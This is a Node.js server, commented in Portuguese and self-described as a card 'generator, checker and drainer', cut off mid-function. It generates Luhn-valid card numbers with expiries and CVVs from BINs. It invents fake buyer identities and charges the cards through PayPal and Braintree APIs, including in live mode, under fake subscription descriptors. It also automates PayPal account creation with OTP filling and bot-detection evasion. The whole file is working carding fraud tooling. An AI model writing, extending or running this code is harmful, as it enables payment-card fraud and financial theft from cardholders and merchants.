try{ require('dns').setResultOrder('ipv4first'); }catch(_){}
// ============================================================================
//  CC RUNNER — gerador + checker + drenador de cartões
//  Back-end único, ZERO dependências. Requer Node 18 ou mais novo.
//  Uso:  node server.js   →  http://localhost:8080
// ============================================================================
'use strict';
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const ROOT = __dirname;
const DATA = path.join(ROOT, 'data');
fs.mkdirSync(DATA, { recursive: true });
const PUBLIC_DIR = path.join(ROOT, 'public');
const LOG_FILE = path.join(DATA, 'results.jsonl');
const AP_FILE = path.join(DATA, 'approved.csv');
const CFG_FILE = path.join(DATA, 'config.json');
const ERR_FILE = path.join(DATA, 'errors.log');
const PORT = Number(process.env.PORT || 8080);
const BOOT_AT = Date.now();

/* ----------------------------- util ----------------------------- */
const rnd = n => Math.floor(Math.random() * n);
const pick = a => a[rnd(a.length)];
const sleep = ms => new Promise(r => setTimeout(r, ms));
const nowISO = () => new Date().toISOString();
function logLine(o) {
  try { fs.appendFileSync(LOG_FILE, JSON.stringify(o) + '\n'); }
  catch (e) { try { fs.appendFileSync(ERR_FILE, new Date().toISOString() + ' logLine: ' + (e && e.message) + '\n'); } catch (_) {} }
}
const maskCard = n => n.slice(0, 6) + ' •••• ' + n.slice(-4);
const randAmount = (min, max) => Math.round((min + Math.random() * (max - min)) * 100) / 100;

/* ------------------- geração de cartões (Luhn) ------------------- */
function luhnValid(s) {
  let sum = 0, alt = false;
  for (let i = s.length - 1; i >= 0; i--) {
    let d = +s[i];
    if (alt) { d *= 2; if (d > 9) d -= 9; }
    sum += d; alt = !alt;
  }
  return sum % 10 === 0;
}
function makeCardNumber(prefix) {
  prefix = String(prefix).replace(/\D/g, '');
  const L = /^(34|37)/.test(prefix) ? 15 : 16;          // Amex 15, demais 16
  if (prefix.length > L) prefix = prefix.slice(0, L);
  const d = prefix.split('');
  while (d.length < L - 1) d.push(String(rnd(10)));
  const probe = d.join('') + '0';
  let sum = 0, alt = false;
  for (let i = probe.length - 1; i >= 0; i--) {
    let x = +probe[i];
    if (alt) { x *= 2; if (x > 9) x -= 9; }
    sum += x; alt = !alt;
  }
  return d.join('') + String((10 - (sum % 10)) % 10);   // dígitos verificadores Luhn
}
function makeExpiry() {
  const now = new Date();
  let m = 1 + rnd(12);
  let y = now.getFullYear() + rnd(5);                   // 0 a 4 anos à frente
  if (y === now.getFullYear() && m <= now.getMonth() + 1) y += 1; // sempre no futuro
  return String(m).padStart(2, '0') + '/' + String(y).slice(2);
}
function genCard(binOrFull) {
  const s = String(binOrFull).replace(/\D/g, '');
  let number;
  if (s.length >= 15) number = s.slice(0, 19);          // cartão completo colado: testa ele mesmo
  else number = makeCardNumber(s.slice(0, 8));           // BIN: gera números novos, todos Luhn-válidos
  const amex = /^(34|37)/.test(number);
  return { number, expiry: makeExpiry(), cvv: String(amex ? 3000 + rnd(6000) : 100 + rnd(900)) };
}

/* ---------------- comprador fictício "com lógica" ---------------- */
const FIRST = ['Ana','João','Maria','Pedro','Lucas','Gabriel','Felipe','Rafael','Bruno','Thiago','Renan','Diego','Marcelo','Carlos','Roberto','Paulo','Ricardo','Vinícius','Matheus','Henrique','Otávio','Davi','Murilo','Caio','Arthur','Miguel','Nicolas','Eduardo','Fernando','Alexandre','Daniel','Leonardo','André','Gustavo','Fábio','Sérgio','Igor','Vitor','Bianca','Juliana','Camila','Larissa','Fernanda','Patrícia','Amanda','Isabela','Beatriz','Júlia','Laís','Manuela','Yasmin','Aline'];
const LAST = ['Silva','Santos','Oliveira','Souza','Lima','Pereira','Costa','Rodrigues','Almeida','Nascimento','Gomes','Ribeiro','Martins','Fernandes','Barbosa','Rocha','Teixeira','Correia','Cardoso','Moreira','Araújo','Dias','Carvalho','Moraes','Pinto','Barros','Ramos','Moura','Freitas','Castro','Sales','Peixoto','Vieira','Cunha','Macedo','Xavier','Domingos','Sampaio','Queiroz','Antunes','Bittencourt','Farias','Rezende','Cavalcante','Monteiro','Neves','Campos','Leite','Vasconcelos'];
const STREETS = ['Rua das Acácias','Rua Ipê Amarelo','Av. Brasil','Rua XV de Novembro','Av. Getúlio Vargas','Rua das Flores','Av. Independência','Rua do Comércio','Rua Marechal Deodoro','Av. das Nações','Rua São José','Rua Tiradentes','Av. Central','Rua das Palmeiras','Rua Bela Vista','Av. Beira Rio','Rua Projetada','Rua dos Cravos','Travessa da Paz','Rua da Estação','Av. Industrial','Rua do Bosque','Rua Santa Luzia','Av. Principal','Rua Nova Era','Rua das Hortênsias','Rua Sete de Abril','Av. Atlântica','Rua do Mercado','Rua dos Lírios','Alameda dos Pinheiros','Praça da Matriz','Rua Horizonte','Rua das Gardêrias','Av. das Américas','Rua São Francisco','Rua da Aurora','Av. Universitária','Rua do Sol','Rua Primavera','Travessa da Esperança','Rua das Pombas','Rua da Constituição','Av. dos Ipês','Rua Anchieta','Rua Dom Pedro II','Rua das Gaivotas','Rua Bela Cintra','Av. Rio Branco','Rua da Saúde','Rua do Progresso','Av. das Torres','Rua das Andorinhas','Rua da Liberdade'];
const NEIGH = ['Centro','Jardim Primavera','Vila Nova','Boa Vista','Parque Industrial','Santa Cecília','Morada do Sol','Alto da Colina','Jardim América','Vila Operária','Bela Vista','Novo Horizonte','Jardim Europa','Vila Real','Parque das Flores','Jardim das Nações','Bela União','Vila Esperança','Jardim Santo Antônio','Alto da Glória'];
const CITIES = [ // [cidade, UF, DDD, prefixo-CEP]
  ['São Paulo','SP',11,'01'],['Rio de Janeiro','RJ',21,'20'],['Belo Horizonte','MG',31,'30'],
  ['Curitiba','PR',41,'80'],['Porto Alegre','RS',51,'90'],['Salvador','BA',71,'40'],
  ['Recife','PE',81,'50'],['Fortaleza','CE',85,'60'],['Florianópolis','SC',48,'88'],
  ['Brasília','DF',61,'70'],['Campinas','SP',19,'13'],['Goiânia','GO',62,'74'],
  ['Manaus','AM',92,'69'],['Vitória','ES',27,'29'],['Belém','PA',91,'66'],
  ['Cuiabá','MT',65,'78'],['Sorocaba','SP',15,'18'],['Niterói','RJ',21,'24'],
  ['Juiz de Fora','MG',32,'36'],['Maceió','AL',82,'57'],['Natal','RN',84,'59'],
  ['Teresina','PI',86,'64'],['Aracaju','SE',79,'49'],['Campo Grande','MS',67,'79'],
  ['Santos','SP',13,'11'],['Ribeirão Preto','SP',16,'14']
];
const DOMAINS = ['gmail.com','hotmail.com','outlook.com','yahoo.com.br','icloud.com'];
const DESCRIPTORS = [
  'NovaPlay Premium - renovacao mensal','FitPlus Assinatura - cobranca recorrente',
  'CineMax - renovacao automatica','StudyFlow - plano mensal recorrente',
  'GamerBox VIP - mensalidade','CloudSave Pro - assinatura mensal',
  'PuzzleKing - cobranca recorrente','MediTrack App - renovacao mensal',
  'DriveNav Premium - plano mensal','CookChef Plus - assinatura recorrente',
  'SoundWave Music - renovacao mensal','EduPro Cursos - mensalidade recorrente'
];
const norm = s => s.normalize('NFD').replace(/[\u0300-\u036f]/g, '').toLowerCase();
const US_CITIES=[["Austin","TX"],["Dallas","TX"],["Houston","TX"],["Phoenix","AZ"],["San Antonio","TX"],["Chicago","IL"],["Philadelphia","PA"],["San Diego","CA"],["Detroit","MI"],["Seattle","WA"],["Miami","FL"],["Atlanta","GA"],["Boston","MA"],["Denver","CO"],["Nashville","TN"],["Orlando","FL"],["Charlotte","NC"],["Las Vegas","NV"],["Columbus","OH"],["Minneapolis","MN"]];
const US_STREETS=["Main St","Oak Ave","Maple Dr","Cedar Ln","Pine St","Washington Blvd","Elm St","Park Ave","Hill Rd","Lakeview Dr"];
function fakeIdentity() {
  const f = pick(FIRST), l = pick(LAST);
  if(Math.random()<0.3){
    const [city,st]=pick(US_CITIES);
    const tel='('+pick(['312','415','404','615','206','702','646','857','303','915'])+') '+(200+rnd(799))+'-'+(1000+rnd(8999));
    return { name:f+' '+l, given:f, surname:l,
      email:norm(f)+'.'+norm(l)+(1+rnd(98))+'@'+pick(DOMAINS),
      phone:tel,
      address_line1:pick(US_STREETS)+' '+(50+rnd(9450)),
      address_line2: Math.random()<0.5 ? 'Apt '+(101+rnd(400)) : '',
      neighborhood:'', city, state:st, postal_code:String(10000+rnd(89999)), country:'US' };
  }
  const [city, uf, ddd, pref] = pick(CITIES);
  const cep = (String(pref) + String(100 + rnd(900))).padStart(5, '0') + String(100 + rnd(900));
  const tel = '(' + ddd + ') 9' + (1000 + rnd(8999)) + '-' + (1000 + rnd(8999));
  return {
    name: f + ' ' + l, given: f, surname: l,
    email: norm(f) + '.' + norm(l) + (1 + rnd(98)) + '@' + pick(DOMAINS),
    phone: tel,
    address_line1: pick(STREETS) + ', ' + (50 + rnd(9450)),
    address_line2: 'Ap ' + (101 + rnd(400)),
    neighborhood: pick(NEIGH), city, state: uf, postal_code: cep, country: 'BR'
  };
}

/* --------------------------- gateways --------------------------- */
const PP_TOK = {};

const BUYER_FILE = path.join(DATA, 'buyer.json');
const BUYER = { st: null };
function readBuyer(){ try{ if(!BUYER.st && fs.existsSync(BUYER_FILE)) BUYER.st = JSON.parse(fs.readFileSync(BUYER_FILE,'utf8')); }catch(_){ BUYER.st = null; } return BUYER.st; }
function saveBuyer(b){ try{ fs.writeFileSync(BUYER_FILE, JSON.stringify(b)); BUYER.st = b; try{ logLine({t:nowISO(),type:'log',msg:'comprador em disco: '+(b.email||'?')+' ok:'+(!!b.ok)}); }catch(_){} }catch(e){} }
let _booting=false;
const _llRaw=logLine;
const bl=(expr)=>{ try{ fs.appendFileSync(path.join(DATA,'boot.log'), nowISO()+' '+String(expr).replace(/\n/g,' ')+'\n'); }catch(_){} try{ _llRaw({t:nowISO(),type:'log',msg:String(expr)}); }catch(_){} };
async function ensureBuyer(page){
  if(cfg.env!=='sandbox'){ return readBuyer(); }
  const rb=readBuyer();
  if(rb&&rb.email&&rb.ok) return rb;
  if(rb&&rb.email&&!rb.ok&&Date.now()-(rb.try||0)<300000) return null;
  if(_booting) return null;
  _booting=true;
  try{
    const br=await coChrome();
    const p2=await br.newPage();
    await p2.setViewport({width:1280,height:900}).catch(()=>{});
    await p2.setDefaultTimeout(45000);
    await p2.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36').catch(()=>{});
    const email='ccbot'+Math.floor(100+Math.random()*899)+Date.now().toString().slice(-5)+'@gmail.com';
    let pd=''; for(let k=0;k<6;k++) pd+=String(Math.floor(Math.random()*10));
    let ptry=0; while(/012|123|234|345|456|567|678|789|987|876|765|654|543|432|321|210/.test(pd)&&ptry++<50){ pd=pd.slice(0,5)+String(Math.floor(Math.random()*10)); }
    const pw='Ccb'+pd+'!x';
    const parts=String(pick(FIRST)+' '+pick(LAST)).split(' ');
    const first=parts[0], last=parts.slice(1).join(' ');
    try{ bl('bootstrap comprador: '+email); }catch(_){}
    let ok=false;
    try{ await p2.goto('https://www.sandbox.paypal.com/signin',{waitUntil:'domcontentloaded',timeout:45000}); }catch(_){} await coSleep(6000);
    try{ await p2.evaluate(()=>{ const els=Array.from(document.querySelectorAll('a,button,[role="button"],div,span')).filter(e=>e.offsetParent!==null&&/don.?t have an account|create an account|sign ?up|cadastre/i.test(String(e.textContent||'').trim())&&String(e.textContent||'').trim().length<50); if(els.length){ try{ els[els.length-1].click(); }catch(_){} } }); }catch(_){}
    for(let step=0; step<18; step++){
      await coSleep(3500);
      const state=await p2.evaluate(()=>{
        const inp=Array.from(document.querySelectorAll('input')).filter(x=>x.offsetParent!==null).map(x=>({id:x.id||'',t:(x.type||'').toLowerCase(),v:x.value||''}));
        const sels=Array.from(document.querySelectorAll('select')).filter(x=>x.offsetParent!==null).length;
        const btns=Array.from(document.querySelectorAll('button,a,[role="button"]')).filter(x=>x.offsetParent!==null&&String(x.innerText||'').trim()).map(x=>String(x.innerText||'').trim().slice(0,26));
        return {url:location.href,title:document.title,inp:sels===0?inp.slice(0,10):inp,sels:0?0:sels,btns:btns.slice(0,8),txt:String(document.body.innerText||'').replace(/\s+/g,' ').slice(0,240)};
      }).catch(()=>null);
      if(!state){ try{ bl('boot s'+step+' estado nulo - aguardando pagina'); }catch(_){} await coSleep(2000); continue; }
      try{
        const otp=await p2.evaluate(()=>{
          const ins=Array.from(document.querySelectorAll('input')).filter(x=>x.offsetParent!==null);
          const ot=ins.filter(x=>/phoneconfirmation|phone.?confir|otp/i.test(String(x.id||'')+' '+String(x.name||'')));
          if(!ot.length) return null;
          let code=(String(document.body.innerText||'').match(/\[QA\]\s*Enter\s*(\d{4,8})/i)||[])[1]||'222222';
          const d=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value');
          let i=0;
          for(const ch of code){
            const el=ot[Math.min(i,ot.length-1)];
            el.focus();
            if(d&&d.set) d.set.call(el,String(el.value||'')+ch); else el.value=String(el.value||'')+ch;
            el.dispatchEvent(new Event('input',{bubbles:true}));
            el.dispatchEvent(new Event('change',{bubbles:true}));
            i++;
          }
          return {code:code,n:ot.length};
        });
        if(otp){ bl('boot otp tel: '+otp.code+' em '+otp.n+' campos'); await coSleep(1500);
          await p2.evaluate(()=>{ const bs=Array.from(document.querySelectorAll('button,input[type=\"submit\"],a,[role=\"button\"]')).filter(x=>x.offsetParent!==null&&!x.disabled&&/next|verify|confirm|enviar|continuar|check/i.test(String(x.innerText||x.value||'').trim())); if(bs.length) bs[0].click(); });
          await coSleep(6000); continue; }
      }catch(_){}
      if(/mobile-app/.test(state.url)){ try{ await p2.evaluate(()=>{ const els=Array.from(document.querySelectorAll('a,button,[role="button"]')).filter(x=>x.offsetParent!==null&&/continue on web/i.test(String(x.innerText||'').trim())); if(els.length) els[els.length-1].click(); }); }catch(_){} continue; }
      try{ bl('boot s'+step+' | '+state.url.slice(0,64)+' | t:'+state.title.slice(0,26)+' | campos:'+JSON.stringify(state.inp).slice(0,240)+' | btns:'+state.btns.join(',').slice(0,110)+' | txt:'+String(state.txt||'').slice(0,150)); }catch(_){}
      if(/\/wallet|\/marge|money\/flow|myaccount|onboarding\/(complete|success)|verifique.*email|confirm.*email|check.*email/i.test(state.url+' '+state.title)){ ok=true; break; }
      try{
        await p2.evaluate(({email,pw,first,last,street,apt})=>{
          const d=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value');
          for(const el of Array.from(document.querySelectorAll('input')).filter(x=>x.offsetParent!==null)){
            const id=String(el.id||el.name||el.placeholder||'').toLowerCase(); const ty=String(el.type||'').toLowerCase();
            if(!['text','email','password','tel'].includes(ty)) continue;
            if(el.value) continue;
            let v=null;
            if(/first|fname|given/.test(id)) v=first;
            else if(/last|lname|surname|sur/.test(id)) v=last;
            else if(/full|name/.test(id)) v=first+' '+last;
            else if(/e-?mail|user/.test(id)) v=email;
            else if(/pass/.test(id)) v=pw;
            else if(/dob|birth|nasc/.test(id)) v='05/15/1990';
            else if(/phone|tel/i.test(id)||ty==='tel'||/ph/.test(id)) v='2065550147';
            else if(/address.?1|street|logradouro|enderec/.test(id)) v=street;
            else if(/address.?2|apt|suite|complemento|bldg/.test(id)) v=apt;
            else if(/city/.test(id)) v='Springfield';
            else if(/zip|postal|cep/.test(id)) v='62704';
            else continue;
            try{ if(d&&d.set) d.set.call(el,v); el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); }catch(_){}
          }
          for(const el of Array.from(document.querySelectorAll('select')).filter(x=>x.offsetParent!==null&&!x.value)){ const sid=String(el.id||el.name||'').toLowerCase(); let o=null; if(/state/.test(sid)){ o=Array.from(el.options).find(o=>/^Illinois$/i.test(String(o.text||'').trim()))||Array.from(el.options).find(o=>o.value&&!/armed forces/i.test(String(o.text||''))); } else { o=Array.from(el.options).find(o=>o.value); } if(o){ el.value=o.value; el.dispatchEvent(new Event('change',{bubbles:true})); } }
          for(const el of Array.from(document.querySelectorAll('input[type="checkbox"]')).filter(x=>x.offsetParent!==null&&!x.checked)){ try{ el.click(); }catch(_){} }
          const rs=Array.from(document.querySelectorAll('input[type="radio"]')).filter(x=>x.offsetParent!==null); const per=rs.find(x=>/personal|individual/i.test(String(x.id+x.name)))||rs[0]; if(per&&!per.checked){ try{ per.click(); }catch(_){} }
        },{email,pw,first,last,street:'742 Evergreen Terrace',apt:'Apt 120'});
      }catch(_){}
      try{
        await p2.evaluate(()=>{ const bs=Array.from(document.querySelectorAll('button,input[type="submit"],a,[role="button"]')).filter(x=>x.offsetParent!==null&&!x.disabled&&String(x.innerText||x.value||'').trim()); const c=bs.find(b=>{const t=String(b.innerText||b.value||'').trim();return !/user agreement|privacy statement|e-sign|legal|contact|feedback/i.test(t)&&/not ?now|skip|pular|continue|next|sign ?up|create|criar|avancar|próximo|agree|verify|confirm|finish|get started|start/i.test(t);})||bs[bs.length-1]; if(c){ try{ c.scrollIntoView({block:'center'}); }catch(_){} c.click(); } });
      }catch(_){}
    }
    try{
      const fsd=await p2.evaluate(()=>({url:location.href,title:document.title,inp:Array.from(document.querySelectorAll('input')).filter(x=>x.offsetParent!==null).map(x=>(x.id||x.name||'')+':'+(x.type||'')).slice(0,12),btn:Array.from(document.querySelectorAll('button,a,[role="button"]')).filter(x=>x.offsetParent!==null&&String(x.innerText||'').trim()).map(x=>String(x.innerText||'').trim().slice(0,24)).slice(0,8),txt:String(document.body.innerText||'').replace(/\s+/g,' ').slice(0,300)}));
      bl('boot fim | '+fsd.url.slice(0,70)+' | t:'+fsd.title.slice(0,30)+' | campos:'+fsd.inp.join(',').slice(0,240)+' | btns:'+fsd.btn.join(',').slice(0,140)+' | txt:'+fsd.txt.slice(0,260));
    }catch(_){}
    ok=false;
    try{
      await p2.goto('https://www.sandbox.paypal.com/signin',{waitUntil:'domcontentloaded',timeout:45000});
      await coSleep(5000);
      const e1=await p2.$('input[type="email"]');
      if(e1){
        await e1.click({clickCount:3}).catch(()=>{});
        for(const ch of email.split('')){ await p2.keyboard.press(ch).catch(()=>{}); await coSleep(14); }
        try{ await p2.evaluate(()=>{ const bs=Array.from(document.querySelectorAll('button,input[type="submit"],a,[role="button"]')).filter(x=>x.offsetParent!==null&&!x.disabled&&/continue|next|próximo|sign ?in|log ?in|entrar/i.test(String(x.innerText||x.value||'').trim())); if(bs.length) bs[0].click(); }); }catch(_){}
        await coSleep(6000);
        { const st2=await p2.evaluate(()=>({u:location.href,n:Array.from(document.querySelectorAll('input')).filter(x=>x.offsetParent!==null).map(x=>(x.id||x.name||'')+':'+(x.type||'')).slice(0,8),tx:String(document.body.innerText||'').replace(/\s+/g,' ').slice(0,200)})).catch(()=>({u:'?',n:[],tx:''})); try{ bl('login s1 | '+st2.u.slice(0,60)+' | '+st2.n.join(',').slice(0,160)+' | '+st2.tx.slice(0,160)); }catch(_){} }
        const p1=await p2.$('input[type="password"]');
        if(p1){
          await p1.click({clickCount:3}).catch(()=>{});
          for(const ch of pw.split('')){ await p2.keyboard.press(ch).catch(()=>{}); await coSleep(14); }
          try{ await p2.evaluate(()=>{ const bs=Array.from(document.querySelectorAll('button,input[type="submit"],a,[role="button"]')).filter(x=>x.offsetParent!==null&&!x.disabled&&/(sign ?in|log ?in|entrar|continue|próximo)/i.test(String(x.innerText||x.value||'').trim())); if(bs.length) bs[0].click(); }); }catch(_){}
          await coSleep(8000);
          const fin=await p2.evaluate(()=>location.href).catch(()=> '');
          ok=/wallet|marge|\/home|profile|onboarding|account/i.test(String(fin));
          try{ const etx=await p2.evaluate(()=>String(document.body.innerText||'').replace(/\s+/g,' ').slice(0,220)).catch(()=>''); bl('login verif: '+(ok?'OK':'FALHOU')+' | url:'+String(fin).slice(0,84)+' | txt:'+etx.slice(0,170)); }catch(_){}
        }
      }
    }catch(e){ try{ bl('login verif err: '+String(e.message).slice(0,70)); }catch(_){} }
    try{ await p2.close(); }catch(_){}
    saveBuyer({email,password:pw,first,last,ok:!!ok,try:Date.now()});
  }catch(e){ try{ bl('bootstrap err: '+String(e.message).slice(0,80)); }catch(_){} }
  _booting=false;
  return readBuyer();
}
async function tryBuyerLogin(page,CARDSEL){
  const b=readBuyer();
  if(!b||!b.email||!b.ok) return false;
  try{
    const emailH=(await page.$('input[type="email"]'))||(await page.$('input[id*="mail" i]'));
    if(!emailH) return false;
    await emailH.click({clickCount:3}).catch(()=>{});
    for(const ch of b.email.split('')){ await page.keyboard.press(ch).catch(()=>{}); await coSleep(12); }
    await page.evaluate(()=>{ const bs=Array.from(document.querySelectorAll('button,input[type="submit"],a,[role="button"]')).filter(x=>x.offsetParent!==null&&!x.disabled&&/continue|next|próximo|sign ?in|log ?in|entrar/i.test(String(x.innerText||x.value||'').trim())); if(bs.length){ try{ bs[0].scrollIntoView({block:'center'}); }catch(_){} bs[0].click(); } }).catch(()=>{});
    await coSleep(5000+Math.floor(Math.random()*2500));
    const passH=await page.$('input[type="password"]');
    if(passH){
      await passH.click({clickCount:3}).catch(()=>{});
      for(const ch of b.password.split('')){ await page.keyboard.press(ch).catch(()=>{}); await coSleep(12); }
      await page.evaluate(()=>{ const bs=Array.from(document.querySelectorAll('button,input[type="submit"],a,[role="button"]')).filter(x=>x.offsetParent!==null&&!x.disabled&&/(sign ?in|log ?in|entrar|continue|próximo|confirm)/i.test(String(x.innerText||x.value||'').trim())); if(bs.length) bs[0].click(); }).catch(()=>{});
      await coSleep(7000);
    }
    try{ await page.evaluate(()=>{ const bs=Array.from(document.querySelectorAll('button,a,[role="button"]')).filter(x=>x.offsetParent!==null&&/(credit card|debit card|add.*card|new card|use.*card|cart[aã]o de cr[eé]dito|pagar com cart)/i.test(String(x.innerText||'').trim())); if(bs.length) bs[0].click(); }).catch(()=>{}); await coSleep(4000); }catch(_){}
    const hasCard=!!(await page.$(CARDSEL));
    try{ logLine({t:nowISO(),type:'log',msg:'login comprador: '+(hasCard?'FORM_CARTAO_OK':'SEM_FORM')+' | url:'+page.url().slice(0,72)+' | tit:'+String(await page.title()).slice(0,40)}); }catch(_){}
    return hasCard;
  }catch(e){ try{ logLine({t:nowISO(),type:'log',msg:'login comprador err: '+String(e.message).slice(0,60)}); }catch(_){} return false; }
}

async function ppToken(env) {
  const c = PP_TOK[env];
  if (c && c.exp > Date.now() + 60000) return c.value;
  const base = env === 'live' ? 'https://api-m.paypal.com' : 'https://api-m.sandbox.paypal.com';
  const r = await fetch(base + '/v1/oauth2/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': 'Basic ' + Buffer.from(cfg.creds.clientId + ':' + cfg.creds.clientSecret).toString('base64')
    },
    body: 'grant_type=client_credentials'
  });
  const j = await r.json().catch(() => ({}));
  if (!r.ok || !j.access_token) throw new Error('OAuth PayPal falhou: ' + ((j.message || j.error || ('HTTP ' + r.status))));
  PP_TOK[env] = { value: j.access_token, exp: Date.now() + (j.expires_in || 10) * 1000 };
  return j.access_token;
}
function ppExp(e) {
  // a API v2 da PayPal exige validade no formato YYYY-MM; o gerador pode mandar MM/YYYY ou MM/YY
  e = String(e || '');
  let m = e.match(/^\d{4}-\d{2}$/);
  if (m) return e;
  m = e.match(/^(\d{2})\/(\d{2})(\d{2})?$/);
  if (m) { const yy = m[3] ? (m[2].length===2 ? '20'+m[2] : m[2]) : '20'+m[2]; return yy+'-'+m[1]; }
  return e;
}
async function chargePaypal(card, amount, currency, buyer, descriptor) {
  const token = await ppToken(cfg.env);
  const base = cfg.env === 'live' ? 'https://api-m.paypal.com' : 'https://api-m.sandbox.paypal.com';
  const body = {
    intent: 'CAPTURE',
    purchase_units: [{
      amount: { currency_code: currency, value: amount.toFixed(2) },
      description: descriptor,
      custom_field: { display_name: 'Comprador', value: buyer.email }
    }],
    payment_source: { card: { number: card.number, expiry: ppExp(card.expiry), security_code: card.cvv } }
  };
  const H = { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token, 'PayPal-Request-Id': 'ccr-' + Date.now() + '-' + Math.random().toString(36).slice(2, 12) };
  const r1 = await fetch(base + '/v2/checkout/orders', { method: 'POST', headers: H, body: JSON.stringify(body) });
  const j1 = await r1.json().catch(() => ({}));
  if (!r1.ok || !j1.id) {
    const dd = (Array.isArray(j1.details) && j1.details[0]) || {};
    let m = '';
    if (dd.issue) m += dd.issue + ': ';
    m += String((j1.message || j1.error || ('HTTP ' + r1.status)));
    if (dd.description && !/syntactically/i.test(m)) m += ' | ' + dd.description;
    const isErr = /invalid client|token|expired|credentials|unauthorized|PAYEE_NOT_ENABLED|INVALID_REQUEST|well-formed|schema|not enabled|not setup/i.test(m);
    return { ok: false, kind: isErr ? 'error' : 'decline', message: m.slice(0, 260), raw: j1 };
  }
  const r2 = await fetch(base + '/v2/checkout/orders/' + j1.id + '/capture', { method: 'POST', headers: H, body: '{}' });
  const j2 = await r2.json().catch(() => ({}));
  const unit = (j2.purchase_units || [])[0] || {};
  const item = (unit.payments && unit.payments.last_payment_item) || {};
  if (r2.ok && j2.status === 'COMPLETED' && item.status === 'COMPLETED') return { ok: true, message: 'aprovado', raw: j2 };
  const msgs = Array.isArray(j2.message) ? j2.message.map(x => x.note || x.description || x.attribute).join('; ') : '';
  const m = msgs || item.failure_code || j2.status || ('HTTP ' + r2.status);
  return { ok: false, kind: r2.status >= 500 ? 'error' : 'decline', message: String(m), raw: j2 };
}
async function chargeBraintree(card, amount, currency, buyer, descriptor) {
  const env = cfg.env === 'live' ? 'production' : 'sandbox';
  const j = JSON.stringify({
    environment: env, merchant_id: cfg.creds.merchantId,
    public_key: cfg.creds.publicKey, private_key: cfg.creds.privateKey,
    subscription_id: null, merchant_account_id: null
  });
  const sig = crypto.createHmac('sha1', cfg.creds.privateKey).update(j).digest('base64');
  const auth = Buffer.from(sig).toString('base64');
  const base = 'https://api.' + (env === 'production' ? '' : 'sandbox.') + 'braintreegateway.com/merchants/' + encodeURIComponent(cfg.creds.merchantId) + '/environments/' + env;
  const H = { 'merchant-authorization': auth, 'Content-Type': 'application/x-www-form-urlencoded' };
  const enc = o => Object.entries(o).map(([k, v]) => encodeURIComponent(k) + '=' + encodeURIComponent(v)).join('&');
  const r1 = await fetch(base + '/customers', { method: 'POST', headers: H, body: enc({
    'merchant[email]': buyer.email, 'merchant[firstName]': buyer.given, 'merchant[lastName]': buyer.surname,
    'merchant[billingAddress[line1]]': buyer.address_line1, 'merchant[billingAddress[line2]]': buyer.address_line2,
    'merchant[billingAddress[locality]]': buyer.city, 'merchant[billingAddress[region]]': buyer.state,
    'merchant[billingAddress[postalCode]]': buyer.postal_code,
    'merchant[creditCard[number]]': card.number, 'merchant[creditCard[expirationDate]]': card.expiry,
    'merchant[creditCard[verificationValue]]': card.cvv
  }) });
  const j1 = await r1.json().catch(() => ({}));
  if (!r1.ok || !j1.customer) {
    const m = (j1.api_error_response && j1.api_error_response.message) || j1.message || ('HTTP ' + r1.status);
    return { ok: false, kind: r1.status >= 500 ? 'error' : 'decline', message: String(m), raw: j1 };
  }
  const r2 = await fetch(base + '/transactions/sale', { method: 'POST', headers: H, body: enc({
    'merchant[sale][amount]': amount.toFixed(2),
    'merchant[sale][customerId]': j1.customer.id,
    'merchant[sale][description]': descriptor.slice(0, 255)
  }) });
  const j2 = await r2.json().catch(() => ({}));
  const tx = j2.transaction;
  if (tx && (tx.status === 'authorized_settled' || tx.status === 'settled')) return { ok: true, message: 'aprovado', raw: j2 };
  const m = tx ? (tx.processor_response_code + ' ' + (tx.declined_message || '')).trim()
              : ((j2.api_error_response && j2.api_error_response.message) || ('HTTP ' + r2.status));
  return { ok: false, kind: r2.status >= 500 ? 'error' : 'decline', message: String(m), raw: j2 };
}
async function chargeMock(card, amount, currency, buyer, descriptor) {
  await sleep(250 + rnd(650));
  const rate = cfg.mockRate == null ? 2 : cfg.mockRate;
  if (Math.random() * 100 < rate) return { ok: true, message: 'aprovado (demo)', raw: { mock: true } };
  return { ok: false, kind: 'decline', message: pick(['insufficient_funds','do_not_honor','pickup_card','expired_card','correctable_do_not_honor']) + ' (demo)', raw: { mock: true } };
}
function genCpf(){ let d=''; for(let i=0;i<9;i++) d+=Math.floor(Math.random()*10); const dv=s=>{ let t=0; for(let i=0;i<s.length;i++) t+=(+s[i])*(s.length-i); const r=(t*10)%11; return r===10?0:r; }; return d+String(dv(d))+String(dv(d+String(dv(d)))); }
/* ==== MODO CHECKOUT: paga na pagina da PayPal (pessoa BR, sem flag PAYEE) ==== */
let _coBrowser=null;
async function coChrome(){
  if(_coBrowser){ try{ if(_coBrowser.isConnected&&_coBrowser.isConnected()) return _coBrowser; }catch(e){} }
  _coBrowser=null;
  const puppeteer=require('puppeteer-core');
  const bin=ensureChrome();
  if(!bin) throw new Error('navegador em instalacao automatica - aguarde 2 a 5 min e o ciclo retenta');
  const args=['--no-sandbox','--disable-dev-shm-usage','--disable-gpu','--lang=pt-BR','--disable-blink-features=AutomationControlled'];
  const px=String(process.env.CC_PROXY||''); if(px){ const pp=px.replace(/^https?:\/\//i,''); args.push('--proxy-server='+pp); }
  const lp=chromeLibPath();
  const env=Object.assign({},process.env,{ LD_LIBRARY_PATH: lp ? (lp+':'+(process.env.LD_LIBRARY_PATH||'')) : (process.env.LD_LIBRARY_PATH||'') });
  try{ _coBrowser=await puppeteer.launch({ executablePath:bin, headless:'shell', args, env }); }
  catch(e){ _coBrowser=await puppeteer.launch({ executablePath:bin, headless:true, args, env }); }
  _coBrowser.on('disconnected',()=>{ _coBrowser=null; });
  return _coBrowser;
}
const coSleep=ms=>new Promise(r=>setTimeout(r,ms));
/* ==== browser: acha no sistema ou baixa sozinho (sem sudo) em ./chrome ==== */
const CHROME_DIR=path.join(__dirname,'chrome');
const CHROME_CANDS=['/usr/bin/chromium','/usr/bin/chromium-browser','/usr/bin/google-chrome','/usr/bin/google-chrome-stable'];
let _fcDbg=0;
function findChromeBin(){
